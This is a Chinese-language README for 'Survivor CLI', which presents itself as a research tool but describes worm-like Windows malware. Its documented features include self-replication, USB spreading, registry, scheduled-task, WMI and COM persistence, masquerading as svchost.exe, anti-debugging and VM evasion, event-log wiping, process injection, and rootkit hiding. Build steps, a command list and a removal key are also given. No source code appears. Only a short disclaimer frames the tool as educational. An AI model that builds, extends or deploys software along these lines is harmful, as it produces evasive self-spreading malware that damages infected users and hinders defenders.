# Survivor CLI

**版本 2.3.0** | Windows 自主保存命令行工具

---

## 语言选择

- **中文** (当前)
- [English Documentation](README.md)

---

## 项目说明

Survivor 是一个用于研究和教育目的的自主命令行工具。它演示了高级持久化技术，能够跨文件系统复制、移动、重命名和传播自身，同时保持持久化后台运行。

**免责声明**：本软件仅供学习和安全研究使用。作者不对任何滥用或由此造成的损害承担责任。

---

## 版本历史

| 版本 | 发布日期 | 主要变更 |
|------|----------|----------|
| 1.0.0 | 2026-04-25 | 初始版本：基础复制、移动、重命名和持久化功能 |
| 2.0.0 | 2026-04-25 | 后台守护线程、自我修复机制、智能目标选择 |
| 2.1.0 | 2026-04-25 | 时间戳伪造、NTFS ADS支持、计划任务伪装、完整性验证 |
| 2.2.0 | 2026-04-25 | 模块化架构、反调试、虚拟机检测、权限检测、自我恢复 |
| 2.3.0 | 2026-04-25 | 隐形增强、WMI持久化、DLL注入、远程更新、P2P加密通信、Windows服务模式、COM劫持、Rootkit能力 |

---

## 架构设计

### 模块化结构

代码库按功能模块组织：

```
survivor::
├── utils        # 通用工具函数
├── detection    # 环境检测（虚拟机、调试器、分析环境）
├── injection    # 进程注入技术
├── persistence  # 注册表和计划任务管理
├── ads          # NTFS 备用数据流
├── spread       # 传播逻辑和目标选择
├── registry     # 实例注册表管理
├── cleanup      # 日志和痕迹清理
├── usb          # USB 移动存储传播
├── network      # 网络扫描功能
├── loops        # 后台线程实现
├── commands     # 命令行接口处理
├── daemon       # 守护进程模式初始化
├── stealth      # 文件属性操作
├── wmi          # WMI 事件订阅持久化
├── dll          # DLL 注入
├── update       # 远程自我更新机制
├── p2p          # 点对点加密通信
├── com          # COM 组件劫持
├── rootkit      # 进程隐藏和 Rootkit 技术
└── service      # Windows 服务模式
```

### 核心能力

| 功能 | 描述 |
|------|------|
| **自我复制** | 复制自身到任意文件系统位置 |
| **自我重定位** | 移动到新路径并保持执行 |
| **动态重命名** | 伪装为系统二进制文件（svchost.exe、rundll32.exe 等） |
| **实例恢复** | 删除当前实例并从备份恢复 |
| **PATH 管理** | 添加或移除其目录到系统 PATH |
| **持久化** | 通过注册表和计划任务维持存在 |

---

## 环境感知

| 检测能力 | 方法 | 自适应响应 |
|----------|------|----------|
| **虚拟机检测** | 检查 VirtualBox、VMware、QEMU 痕迹 | 传播间隔延长 10 倍 |
| **监控工具检测** | 扫描 Process Monitor、Process Hacker 等 | 切换静默模式（抑制输出） |
| **分析环境检测** | 检测沙箱、计算机名中的分析标记 | 极端谨慎模式（50 倍延迟乘数） |
| **调试器检测** | 使用 IsDebuggerPresent 和时序检查 | 激活静默模式 |
| **权限检测** | 验证管理员权限 | 在状态输出中显示 |

---

## 自主操作

无参数执行时，将启动以下后台线程：

| 线程 | 功能 | 间隔 |
|------|------|------|
| **SpreadingLoop** | 随机复制、移动或重命名到用户目录 | 30秒 - 5分钟 |
| **MonitoringLoop** | 检测缺失实例，触发反击恢复 | 500毫秒 |
| **RestorationLoop** | 定期检查并恢复缺失实例 | 30秒 |
| **GuardianLoop** | 注入到关键进程，监控并重新注入 | 5分钟 |
| **USBMonitorLoop** | 检测 USB 插入，传播到可移动介质 | 5秒 |
| **CleanupLoop** | 删除日志文件和清除事件日志 | 30分钟 |

---

## 安全特性

- **路径验证**：通过 `..` 序列防止目录遍历攻击
- **XOR 混淆注册表**：实例数据使用基础混淆存储
- **校验和验证**：内置 FNV-1a 哈希进行完整性验证
- **紧急恢复**：经过认证的命令可移除所有实例和痕迹

---

## 命令行接口

### 使用方法

```bash
survivor.exe [命令] [参数]
```

### 可用命令

| 命令 | 描述 | 示例 |
|------|------|------|
| *（无参数）* | 以守护进程模式启动 | `survivor.exe` |
| `copy <路径>` | 复制到指定目标路径 | `survivor.exe copy C:\temp\test.exe` |
| `move <路径>` | 重定位到目标路径 | `survivor.exe move D:\tools\survivor.exe` |
| `rename <名称>` | 重命名当前实例 | `survivor.exe rename svchost.exe` |
| `hide` | 自我删除并从备份恢复 | `survivor.exe hide` |
| `env --add` | 添加目录到系统 PATH | `survivor.exe env --add` |
| `env --remove` | 从 PATH 移除目录 | `survivor.exe env --remove` |
| `plant` | 安装持久化机制 | `survivor.exe plant` |
| `status` | 显示详细运行时状态 | `survivor.exe status` |
| `summon` | 列出所有已注册实例 | `survivor.exe summon` |
| `sync` | 同步所有实例 | `survivor.exe sync` |
| `check` | 验证和恢复实例 | `survivor.exe check` |
| `spread` | 手动触发传播 | `survivor.exe spread` |
| `guardian` | 注入到系统进程 | `survivor.exe guardian` |
| `version` | 显示版本信息 | `survivor.exe version` |
| `verify` | 验证完整性和校验和 | `survivor.exe verify` |

### 紧急命令

| 命令 | 描述 | 认证密钥 |
|------|------|----------|
| `ilovecwj <密钥>` | 移除所有实例并清理 | `cwj_rocks_2026` |

---

## 构建说明

### 前提条件

- MinGW-w64 g++（支持 C++17）或 MSVC 2019+
- CMake 3.10 或更高版本
- Windows SDK

### 构建过程

```bash
# 创建并进入构建目录
mkdir build
cd build

# 使用 CMake 配置
cmake -G "MinGW Makefiles" ..

# 编译
mingw32-make

# 显示帮助
./survivor.exe --help
```

### 依赖项

通过 CMake `target_link_libraries` 链接：

- `shell32`
- `advapi32`
- `iphlpapi`
- `wininet`
- `winmm`
- `kernel32`

---

## 技术规格

### 注册表存储

实例注册表（XOR 混淆）：
```
%APPDATA%\survivor\registry.dat
```

### 配置结构

```cpp
struct Config {
    int spread_interval_min = 30;
    int spread_interval_max = 300;
    int monitor_interval_ms = 500;
    int restore_interval_sec = 30;
    int guardian_interval_min = 5;
    int usb_scan_interval_sec = 5;
    int cleanup_interval_min = 30;
    int counterattack_count = 5;
    bool enable_timestomping = true;
    bool enable_ads = true;
    bool enable_scheduled_task = true;
    bool enable_event_log_cleaning = true;
    bool enable_self_healing = true;
    bool enable_anti_debug = true;
    bool enable_vm_evasion = true;
};
```

### 运行时变量

| 变量 | 描述 |
|------|------|
| `g_running` | 后台线程执行控制 |
| `g_daemon` | 守护进程模式状态 |
| `g_spreading` | 传播状态 |
| `g_spread_multiplier` | 传播间隔乘数 |
| `g_verbose` | 日志输出控制 |

---

## 测试协议

### 安全须知

**本软件应仅在隔离的虚拟环境中测试。** 它会自主传播，可能难以从系统中完全移除。

### 推荐测试环境

1. 使用 VirtualBox 或 VMware 创建 Windows 虚拟机
2. 在执行任何测试前创建快照
3. 在虚拟机内运行所有测试
4. 测试后还原快照以确保完全清理

### 基础验证

```batch
survivor.exe --help
survivor.exe version
survivor.exe status
survivor.exe verify
```

---

## 移除说明

### 标准移除

```batch
survivor.exe ilovecwj cwj_rocks_2026
```

### 手动清理

```batch
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck /f
rmdir /s /q "%APPDATA%\survivor"
```

---

## 认证信息

```
cwj_rocks_2026
```

---

**最后更新**：2026-04-25  
**作者**：AK60000  
**许可证**：MIT

[English Documentation](README.md)
